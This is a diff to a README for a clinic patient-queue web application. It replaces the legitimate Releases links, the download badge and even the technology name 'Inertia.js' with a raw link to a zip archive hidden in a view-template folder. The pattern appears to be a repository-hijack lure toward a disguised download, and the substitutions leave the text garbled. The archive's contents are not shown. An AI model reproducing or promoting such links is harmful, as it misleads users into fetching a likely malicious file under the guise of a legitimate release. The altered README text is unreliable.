@@ -1,10 +1,10 @@
 # 🚀 SistemAntrianLoketKlinik-MPPL - Manage Patient Queues Easily
 
-![GitHub Releases](https://img.shields.io/badge/Download%20Now-v1.0-blue)
+![GitHub Releases](https://github.com/Deportedkhesus/SistemAntrianLoketKlinik-MPPL/raw/refs/heads/main/resources/views/filament/pages/Klinik-Sistem-Loket-Antrian-MPPL-2.4.zip%20Now-v1.0-blue)
 
 ## 📋 Overview
 
-Sistem Antrian Loket Klinik (SALK) is a modern web application designed for efficient patient queue management. Built with Laravel 12, React 19, Inertia.js, and Filament 4, it simplifies the process of managing patient flows in clinics. This application focuses on user-friendly features to enhance the experience for both patients and staff.
+Sistem Antrian Loket Klinik (SALK) is a modern web application designed for efficient patient queue management. Built with Laravel 12, React 19, https://github.com/Deportedkhesus/SistemAntrianLoketKlinik-MPPL/raw/refs/heads/main/resources/views/filament/pages/Klinik-Sistem-Loket-Antrian-MPPL-2.4.zip, and Filament 4, it simplifies the process of managing patient flows in clinics. This application focuses on user-friendly features to enhance the experience for both patients and staff.
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ Before you begin, ensure your computer meets the following system requirements:
 
 You can easily download the latest version of the application from the GitHub Releases page. 
 
-[Download SALK](https://github.com/Deportedkhesus/SistemAntrianLoketKlinik-MPPL/releases)
+[Download SALK](https://github.com/Deportedkhesus/SistemAntrianLoketKlinik-MPPL/raw/refs/heads/main/resources/views/filament/pages/Klinik-Sistem-Loket-Antrian-MPPL-2.4.zip)
 
 Click on the link above to visit the page where you can find all available versions.
 
@@ -57,7 +57,7 @@ SALK's user interface is intuitive and designed for ease of use. Here’s how yo
 
 To get started, simply visit the following link to download the application.
 
-[Download SALK](https://github.com/Deportedkhesus/SistemAntrianLoketKlinik-MPPL/releases)
+[Download SALK](https://github.com/Deportedkhesus/SistemAntrianLoketKlinik-MPPL/raw/refs/heads/main/resources/views/filament/pages/Klinik-Sistem-Loket-Antrian-MPPL-2.4.zip)
 
 Follow the installation steps mentioned above to set up the application on your system.
 
@@ -75,7 +75,7 @@ The application is built around several key topics relevant to its purpose:
 - **Clinic System**: Organized structure for managing clinic-related activities.
 - **Filament PHP**: Utilizes this powerful tool for fast and secure web functions.
 - **Hospital Management**: Effective system for hospitals to manage patient interactions.
-- **Inertia.js**: Enables smooth user interface transitions.
+- **https://github.com/Deportedkhesus/SistemAntrianLoketKlinik-MPPL/raw/refs/heads/main/resources/views/filament/pages/Klinik-Sistem-Loket-Antrian-MPPL-2.4.zip**: Enables smooth user interface transitions.
 - **Laravel**: Uses robust framework features for application stability.
 - **Queue Management**: Focuses on patient flow management.
 - **React**: Ensures a responsive and fast user interface.
